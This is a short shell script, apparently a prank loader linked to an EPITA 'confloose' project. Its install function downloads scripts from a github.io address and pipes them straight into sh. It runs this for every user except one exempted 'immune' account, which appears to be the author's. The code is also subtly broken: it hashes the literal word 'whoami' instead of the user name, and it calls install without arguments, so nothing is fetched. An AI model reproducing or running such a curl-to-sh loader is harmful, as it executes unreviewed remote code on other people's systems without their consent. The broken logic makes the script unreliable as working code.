install() {
    for arg in "$@"; do
        curl "https://d-002.github.io/epita/confloose/$arg/confloose.sh" | sh;
    done
}
hash=$(echo whoami | md5sum | tr -dc 'a-f0-9')
if [ "$hash" != "a8422b0d1789c5025c3fe7f8c8e959b2" ]; then
    install
else
    echo "Sorry, but this user is immune."
fi
